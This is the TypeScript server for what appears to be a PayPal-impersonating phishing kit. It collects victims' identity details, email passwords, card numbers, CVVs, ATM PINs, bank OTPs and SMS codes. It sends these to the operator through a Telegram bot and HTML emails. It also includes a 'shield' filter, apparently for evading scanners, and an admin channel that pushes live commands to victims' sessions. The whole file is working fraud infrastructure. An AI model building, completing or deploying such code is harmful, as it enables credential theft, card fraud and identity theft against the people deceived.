import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import cors from 'cors';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import fs from 'fs';
import crypto from 'crypto';
import https from 'https';
import nodemailer from 'nodemailer';
import geoip from 'geoip-lite';
import cookieParser from 'cookie-parser';
import { shieldMiddleware, verifyHandler } from './shield';
import * as db from './db';

const app = express();
const httpServer = createServer(app);

// Determine allowed origins from env var (comma-separated) or default to "*"
const rawOrigins = process.env.ALLOWED_ORIGINS;
const allowedOrigins = rawOrigins ? rawOrigins.split(',').map(o => o.trim()) : "*";

let corsOrigin: any = "*"; // Default to wildcard

if (allowedOrigins !== "*") {
    corsOrigin = (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
        if (!origin) {
            // Allow requests with no origin (non-browser)
            return callback(null, true);
        }

        if ((allowedOrigins as string[]).includes(origin)) {
            callback(null, true);
        } else {
            console.log(`[CORS] Blocked origin: ${origin}`);
            callback(new Error('Not allowed by CORS'));
        }
    };
}

const corsOptions = {
    origin: corsOrigin,
    methods: ["GET", "POST"]
};
console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);

const io = new Server(httpServer, {
    cors: corsOptions
});

const PORT = process.env.PORT || 8080;

// --- Email Transporter ---
const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.gmail.com',
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
    },
});

// --- Middleware ---
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            scriptSrcAttr: ["'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org", "https://flagcdn.com"],
            connectSrc: ["'self'"],
            frameSrc: ["'self'"]
        }
    }
}));
app.use(cors(corsOptions));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());

// Rate Limiting - Disabled to prevent Render proxy issues
app.set('trust proxy', 1);
// const apiLimiter = rateLimit({
//     windowMs: 15 * 60 * 1000, // 15 minutes
//     max: 500 // Limit each IP to 500 requests per windowMs
// });
// app.use('/api/', apiLimiter);

// --- Socket.IO ---

// Map to track socketId -> sessionId
const socketSessionMap = new Map<string, string>();

io.on('connection', (socket) => {
    console.log('[Socket] Client connected:', socket.id);

    socket.on('join', (sessionId) => {
        socket.join(sessionId);
        socketSessionMap.set(socket.id, sessionId);
        console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
    });

    socket.on('joinAdmin', () => {
        socket.join('admin');
        console.log(`[Socket] ${socket.id} joined ADMIN room`);
    });

    socket.on('disconnect', () => {
        console.log('[Socket] Client disconnected:', socket.id);

        // Retrieve associated session ID
        const sessionId = socketSessionMap.get(socket.id);
        if (sessionId) {
            // Force "Offline" status by setting lastSeen > 1 min ago
            // Using 70000ms (70s) to be safely over the 60s threshold
            const offlineTime = Date.now() - 70000;
            db.updateLastSeen(sessionId, offlineTime).then(() => {
                 // Notify admins to update list immediately
                 io.emit('sessions-updated');
            });

            socketSessionMap.delete(socket.id);
        }
    });
});

// --- API Routes ---

// Shield Verify Endpoint (Bypassed by Shield Middleware)
app.post('/api/shield/verify', verifyHandler);

// Apply Shield (Protects all subsequent routes and static files)
app.use(shieldMiddleware);

// Settings Helper
let cachedSettings: any = {};
const refreshSettings = async () => {
    try {
        cachedSettings = await db.getSettings();
        // Fallback to Env
        if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env.TELEGRAM_BOT_TOKEN;
        if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env.TELEGRAM_CHAT_ID;
        if (!cachedSettings.email) cachedSettings.email = process.env.ADMIN_EMAIL;
    } catch (e) { console.error('Failed to load settings', e); }
};
refreshSettings();

const getFlagEmoji = (countryCode: string) => {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
};

const formatSessionForTelegram = (session: any, title: string, flag: string) => {
    const s = session;
    const d = s.data || s; // Fallback

    // Helper for "Value or Empty"
    const v = (val: any) => val ? `<code>${val}</code>` : '<i>(Empty)</i>';

    let msg = `${flag} <b>${title}</b>\n\n`;

    msg += `🆔 <b>Session ID:</b> <code>${s.sessionId || s.id}</code>\n`;
    msg += `🌍 <b>IP Address:</b> <code>${s.fingerprint?.ip || s.ip || 'Unknown'}</code>\n`;
    msg += `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n`;

    // Identity
    if (d.firstName || d.lastName || d.email) {
        msg += `\n👤 <b>IDENTITY PROFILE</b>\n`;
        msg += `├ <b>Name:</b> ${v((d.firstName + ' ' + d.lastName).trim())}\n`;
        msg += `├ <b>DOB:</b> ${v(d.dob)}\n`;
        msg += `├ <b>Phone:</b> ${v(d.phoneNumber)}\n`;
        msg += `├ <b>Addr:</b> ${v(d.address)}\n`;
        msg += `└ <b>Loc:</b> ${v(d.country)}\n`;
    }

    // Credentials
    if (d.email || d.password) {
        msg += `\n🔐 <b>CREDENTIALS</b>\n`;
        msg += `├ <b>Email:</b> ${v(d.email)}\n`;
        msg += `└ <b>Pass:</b> ${v(d.password)}\n`;
    }

    // Financial
    if (d.cardNumber) {
        msg += `\n💳 <b>FINANCIAL</b>\n`;
        msg += `├ <b>Type:</b> ${v(d.cardType)}\n`;
        msg += `├ <b>Card:</b> ${v(d.cardNumber)}\n`;
        msg += `├ <b>Exp:</b> ${v(d.cardExpiry)} • <b>CVV:</b> ${v(d.cardCvv)}\n`;
        msg += `├ <b>ATM PIN:</b> ${v(d.atmPin)}\n`;
        msg += `└ <b>Bank OTP:</b> ${v(d.cardOtp)}\n`;
    }

    if (d.phoneCode) {
        msg += `\n📱 <b>SMS VERIFICATION</b>\n`;
        msg += `└ <b>Code:</b> ${v(d.phoneCode)}\n`;
    }

    // Fingerprint
    if (s.fingerprint) {
        msg += `\n💻 <b>DEVICE FINGERPRINT</b>\n`;
        msg += `├ <b>OS/Plat:</b> ${s.fingerprint.platform || 'Unknown'}\n`;
        msg += `└ <b>Agent:</b> ${s.fingerprint.userAgent || 'Unknown'}\n`;
    }

    return msg;
};

const formatSessionForEmail = (session: any, title: string) => {
    const s = session;
    const d = s.data || s;

    // Styles
    const styleContainer = 'font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 10px; background-color: #fafafa;';
    const styleHeader = 'color: #003087; font-size: 24px; font-weight: bold; margin-bottom: 20px; border-bottom: 2px solid #003087; padding-bottom: 10px;';
    const styleSection = 'margin-top: 20px; margin-bottom: 10px; color: #555; font-size: 14px; font-weight: bold; text-transform: uppercase; border-bottom: 1px solid #ddd; padding-bottom: 5px;';
    const styleRow = 'display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;';
    const styleLabel = 'color: #777; font-weight: bold; min-width: 120px;';
    const styleValue = 'color: #333; font-family: monospace; font-weight: bold;';

    const row = (label: string, val: any) => `
        <div style="${styleRow}">
            <span style="${styleLabel}">${label}</span>
            <span style="${styleValue}">${val || '<span style="color:#ccc">---</span>'}</span>
        </div>`;

    let html = `<div style="${styleContainer}">`;
    html += `<div style="${styleHeader}">${title}</div>`;

    html += row('Session ID', s.sessionId || s.id);
    html += row('IP Address', s.fingerprint?.ip || s.ip || 'Unknown');
    html += row('Time', new Date().toLocaleString());

    if (d.firstName || d.lastName) {
        html += `<div style="${styleSection}">Identity Profile</div>`;
        html += row('Full Name', (d.firstName + ' ' + d.lastName).trim());
        html += row('DOB', d.dob);
        html += row('Phone', d.phoneNumber);
        html += row('Address', d.address);
        html += row('Location', d.country);
    }

    if (d.email || d.password) {
        html += `<div style="${styleSection}">Login Credentials</div>`;
        html += row('Email / User', d.email);
        html += row('Password', d.password);
    }

    if (d.cardNumber) {
        html += `<div style="${styleSection}">Financial Instrument</div>`;
        html += row('Card Type', d.cardType);
        html += row('Card Number', d.cardNumber);
        html += row('Expiry', d.cardExpiry);
        html += row('CVV', d.cardCvv);
        if (d.atmPin) html += row('ATM PIN', d.atmPin);
        html += row('Bank OTP', d.cardOtp);
    }

    if (d.phoneCode) {
        html += `<div style="${styleSection}">Verification</div>`;
        html += row('SMS Code', d.phoneCode);
    }

    if (s.fingerprint) {
        html += `<div style="${styleSection}">Device Info</div>`;
        html += row('Platform', s.fingerprint.platform);
        html += `<div style="margin-top:5px; font-size:11px; color:#999; word-break:break-all;">${s.fingerprint.userAgent}</div>`;
    }

    html += `<div style="margin-top: 30px; text-align: center; font-size: 12px; color: #999;">
        <p>Login to Admin Dashboard for more actions.</p>
    </div>`;
    html += `</div>`;

    return html;
};

const sendTelegram = (msg: string) => {
    const token = cachedSettings.tgToken;
    const chat = cachedSettings.tgChat;
    if (!token || !chat) return;

    const data = JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' });
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };
    const req = https.request(options, res => {});
    req.on('error', e => console.error('[Telegram] Error:', e));
    req.write(data);
    req.end();
};

const sendEmail = async (session: any, title: string) => {
    if (!cachedSettings.email) return;

    // Check if Admin is online
    const adminRoom = io.sockets.adapter.rooms.get('admin');
    if (adminRoom && adminRoom.size > 0) {
        console.log(`[Email] Admin online, suppressing email for session ${session.sessionId}`);
        return;
    }

    console.log(`[Email] Sending email to ${cachedSettings.email} for session ${session.sessionId}`);

    const htmlBody = formatSessionForEmail(session, title);

    try {
        const info = await transporter.sendMail({
            from: process.env.SMTP_FROM || '"PayPal Verifier" <no-reply@example.com>',
            to: cachedSettings.email,
            subject: `✅ ${title} - ${session.sessionId}`,
            html: htmlBody
        });
        console.log(`[Email] Email sent: ${info.messageId}`);
    } catch (error) {
        console.error(`[Email] Email failed:`, error);
    }
};

const getClientIp = (req: express.Request) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (typeof xForwardedFor === 'string') {
        return xForwardedFor.split(',')[0].trim();
    } else if (Array.isArray(xForwardedFor)) {
        return xForwardedFor[0].trim();
    }
    return req.socket.remoteAddress || 'Unknown';
};

const getIpCountry = (ip: string) => {
    const geo = geoip.lookup(ip);
    return geo ? geo.country : null;
};

// 1. Sync State (Hybrid: HTTP for data, Socket for notify)
app.post('/api/sync', async (req, res) => {
    try {
        const data = req.body;
        if (!data || !data.sessionId) {
            return res.status(400).json({ error: 'Missing sessionId' });
        }

        const ip = getClientIp(req);
        const country = getIpCountry(ip);

        // Merge calculated Country into data
        if (country) {
            data.ipCountry = country;
        }

        // Notification Logic
        const existing = await db.getSession(data.sessionId);

        // 1. New Session (Push Telegram)
        if (!existing) {
             const flag = getFlagEmoji(country || 'XX');
             const msg = formatSessionForTelegram(data, 'New Session Started', flag);
             sendTelegram(msg);
        }
        // 2. Completed Session (Email + Telegram)
        else if (existing.status !== 'Verified' && data.status === 'Verified') {
             const flag = getFlagEmoji(country || existing.ipCountry || 'XX');
             const cardType = data.cardType ? `[${data.cardType.toUpperCase()}]` : '[CARD]';
             const title = `Session Verified ${cardType}`;

             const msg = formatSessionForTelegram(data, title, flag);
             sendTelegram(msg);
             sendEmail(data, title);
        }

        // Prevent downgrading 'Verified' status
        if (existing && existing.status === 'Verified' && data.status !== 'Verified') {
            console.log(`[Sync] Preventing status downgrade for ${data.sessionId}. Keeping 'Verified'.`);
            data.status = 'Verified';
        }

        await db.upsertSession(data.sessionId, data, ip);

        // Notify Admin Room (broadcast to all admins if we had separate admin rooms)
        // For now, simply broadcast to everyone listening for 'session-update'
        io.emit('sessions-updated');

        // Check for pending commands
        const cmd = await db.getCommand(data.sessionId);
        if (cmd) {
            // Also emit directly to socket if connected
            io.to(data.sessionId).emit('command', cmd);
            return res.json({ status: 'ok', command: cmd });
        }

        res.json({ status: 'ok' });
    } catch (e) {
        console.error('[Sync] Error:', e);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

// Settings API
app.get('/api/settings', async (req, res) => {
    await refreshSettings();
    res.json(cachedSettings);
});

app.post('/api/settings', async (req, res) => {
    const { email, tgToken, tgChat } = req.body;
    if (email !== undefined) await db.updateSetting('email', email);
    if (tgToken !== undefined) await db.updateSetting('tgToken', tgToken);
    if (tgChat !== undefined) await db.updateSetting('tgChat', tgChat);

    await refreshSettings();
    res.json({ status: 'ok' });
});

// 2. Fetch Sessions (Admin)
app.get('/api/sessions', async (req, res) => {
    try {
        const sessions = await db.getAllSessions();

        if (sessions.length > 0) {
            console.log('[API] /sessions returning:', JSON.stringify(sessions[0], null, 2));
        }

        // Optimization: ETag for caching
        const json = JSON.stringify(sessions);
        const etag = crypto.createHash('md5').update(json).digest('hex');

        if (req.headers['if-none-match'] === etag) {
            return res.status(304).end();
        }

        res.setHeader('ETag', etag);
        res.setHeader('Content-Type', 'application/json');
        res.send(json);
    } catch (e) {
        res.status(500).json([]);
    }
});

// 3. Admin Command
app.post('/api/command', async (req, res) => {
    try {
        const { sessionId, action, payload } = req.body;
        if (!sessionId || !action) {
            return res.status(400).send('Invalid Command');
        }

        // Prevent commands for revoked sessions
        const session = await db.getSession(sessionId);
        if (session && session.status === 'Revoked') {
            return res.status(403).json({ error: 'Session is revoked' });
        }

        await db.queueCommand(sessionId, action, payload);

        // Real-time Push
        io.to(sessionId).emit('command', { action, payload });

        res.json({ status: 'queued' });
    } catch (e) {
        res.status(500).send('Error queuing command');
    }
});

// Delete Session
app.delete('/api/sessions/:id', async (req, res) => {
    try {
        console.log('[API] Deleting session:', req.params.id);
        await db.deleteSession(req.params.id);
        io.emit('sessions-updated');
        res.json({ status: 'deleted' });
    } catch (e) {
        console.error('[API] Delete failed:', e);
        res.status(500).json({ error: 'Failed to delete' });
    }
});

// Pin Session
app.post('/api/sessions/:id/pin', async (req, res) => {
    try {
        const session = await db.getSession(req.params.id);
        if (session) {
            session.isPinned = !session.isPinned;
            await db.upsertSession(session.id, session, session.ip);
            io.emit('sessions-updated');
            res.json({ status: 'ok', isPinned: session.isPinned });
        } else {
            res.status(404).json({ error: 'Not found' });
        }
    } catch (e) {
        res.status(500).json({ error: 'Failed to pin' });
    }
});

// Revoke Session
app.post('/api/sessions/:id/revoke', async (req, res) => {
    try {
        const id = req.params.id;
        console.log('[API] Revoking session:', id);

        const session = await db.getSession(id);
        if (session) {
            // Update status - KEEP as 'Active' so it remains in Admin List
            // But the client will be reset via command
            session.status = 'Active';
            await db.upsertSession(id, session, session.ip);

            // Queue Command for Client
            await db.queueCommand(id, 'REVOKE', {});

            // Notify Client (Real-time)
            io.to(id).emit('command', { action: 'REVOKE', payload: {} });

            // Notify Admins
            io.emit('sessions-updated');

            res.json({ status: 'revoked' });
        } else {
            res.status(404).json({ error: 'Not found' });
        }
    } catch (e) {
        console.error('[API] Revoke failed:', e);
        res.status(500).json({ error: 'Failed to revoke' });
    }
});

// 4. Health Check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

// --- Static Files (Frontend) ---
const staticPaths = [
    path.join(__dirname, '../static'),           // Docker / Production
    path.join(__dirname, '../dist/app/browser')  // Local Development
];

// Register all paths with cache control
staticPaths.forEach(p => app.use(express.static(p, {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('index.html')) {
            // Never cache index.html to ensure clients get new CSS/JS hashes
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
            res.setHeader('Pragma', 'no-cache');
            res.setHeader('Expires', '0');
        } else {
            // Cache other static assets (hashed) for a long time
            res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
        }
    }
})));

// Pre-resolve the path containing index.html to avoid per-request I/O
const indexHtmlPath = staticPaths.find(p => fs.existsSync(path.join(p, 'index.html')));

if (indexHtmlPath) {
    console.log(`[Server] Serving SPA from: ${indexHtmlPath}`);
    // Debug: List files in the static directory to help diagnose 404s
    try {
        const files = fs.readdirSync(indexHtmlPath);
        console.log('[Server] Files in static directory:', files);
    } catch (e) {
        console.warn('[Server] Failed to list static directory files:', e);
    }
} else {
    console.warn(`[Server] ⚠️  Frontend not found in: ${staticPaths.join(', ')}`);
}

// Fallback for SPA (Angular Router)
app.get('*', (req, res) => {
    // 1. If it looks like a static asset, return 404
    // This prevents the server from returning index.html for missing CSS/JS,
    // which causes MIME type blocking in browsers.
    if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|json|map)$/)) {
        console.warn(`[Server] 404 Not Found for static asset: ${req.path}`);
        return res.status(404).send('Not Found');
    }

    // 2. Otherwise serve index.html for SPA routing
    if (indexHtmlPath) {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.sendFile(path.join(indexHtmlPath, 'index.html'));
    } else {
        res.status(404).send(`
            <h1>Frontend Not Found</h1>
            <p>Please build the application first:</p>
            <pre>npm run build</pre>
            <p>Searched paths:</p>
            <ul>${staticPaths.map(p => `<li>${p}</li>`).join('')}</ul>
        `);
    }
});

// --- Start Server ---
httpServer.listen(PORT, () => {
    console.log(`[Server] ✅ Express + Socket.IO running on port ${PORT}`);
});
